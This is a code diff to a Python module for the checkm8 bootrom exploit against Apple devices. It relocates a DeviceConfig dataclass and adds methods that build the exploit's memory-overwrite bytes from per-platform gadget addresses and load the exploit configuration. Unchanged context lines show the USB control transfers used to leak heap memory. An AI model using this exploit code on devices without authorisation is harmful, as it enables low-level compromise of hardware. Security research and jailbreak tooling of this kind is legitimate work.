@@ -8,6 +8,7 @@ import struct
 import sys
 import time
 import typing
+import weakref
 from contextlib import suppress
 from typing import TYPE_CHECKING, Optional, Tuple, Union
 
@@ -23,6 +24,22 @@ if TYPE_CHECKING:
 request = None
 transfer_ptr = None
 never_free_device = None
+
+
+@dataclasses.dataclass
+class DeviceConfig:
+    version: str
+    cpid: int
+    large_leak: Optional[int]
+    overwrite: bytes
+    overwrite_offset: int
+    hole: Optional[int]
+    leak: Optional[int]
+
+    def __post_init__(self) -> None:
+        assert len(self.overwrite) <= 0x800
+        if not self.hole:
+            self.hole = 0
 
 
 @dataclasses.dataclass
@@ -47,6 +64,23 @@ class Checkm8Overwrite:
     pack: str
     args: typing.List[Union[str, int]]
 
+    _checkm8: typing.Optional[Checkm8] = None
+
+    def __post_init__(self):
+        if not self.args:
+            self.args = []
+
+    def generate_overwrite(self, platform: device_platform.DevicePlatform):
+        def get_value(symbol: typing.Union[str, int]) -> int:
+            if isinstance(symbol, int):
+                return symbol
+
+            return platform.gadgets[symbol]
+
+        values = [get_value(symbol) for symbol in self.args]
+
+        return (b"\0" * self.preamble) + struct.pack(self.pack, *values)
+
 
 @dataclasses.dataclass
 class Checkm8:
@@ -56,11 +90,41 @@ class Checkm8:
     leak: typing.Optional[int] = None
     large_leak: typing.Optional[int] = None
 
+    _device_platform: typing.Optional[device_platform.DevicePlatform] = None
+
     def __post_init__(self):
         if isinstance(self.constants, dict):
             self.constants = Checkm8Constants(**self.constants)
         if isinstance(self.overwrite, dict):
             self.overwrite = Checkm8Overwrite(**self.overwrite)
+            self.overwrite._checkm8 = weakref.ref(self)
+
+    @classmethod
+    def from_platform(cls, platform: device_platform.DevicePlatform) -> Checkm8:
+        if "checkm8" not in platform.exploit_configs:
+            print("ERROR: This is not a checkm8 compatible device. Exiting.")
+            sys.exit(1)
+
+        result = cls(**platform.exploit_configs["checkm8"])
+        result._device_platform = platform
+        return result
+
+    @property
+    def device_platform(self):
+        return self._device_platform
+
+    def device_config(self) -> DeviceConfig:
+        assert self._device_platform
+
+        return DeviceConfig(
+            self._device_platform.srtg,
+            self._device_platform.cpid,
+            self.large_leak,
+            self.overwrite.generate_overwrite(self._device_platform),
+            0,
+            self.hole,
+            self.leak,
+        )
 
 
 def libusb1_create_ctrl_transfer(device: "Device", request, timeout):
@@ -235,22 +299,6 @@ def usb_req_leak(device: "Device") -> None:
 
 def usb_req_no_leak(device: "Device"):
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
-
-
-@dataclasses.dataclass
-class DeviceConfig:
-    version: str
-    cpid: int
-    large_leak: Optional[int]
-    overwrite: bytes
-    overwrite_offset: int
-    hole: Optional[int]
-    leak: Optional[int]
-
-    def __post_init__(self) -> None:
-        assert len(self.overwrite) <= 0x800
-        if not self.hole:
-            self.hole = 0
 
 
 PAYLOAD_OFFSET_ARMV7 = 0x180
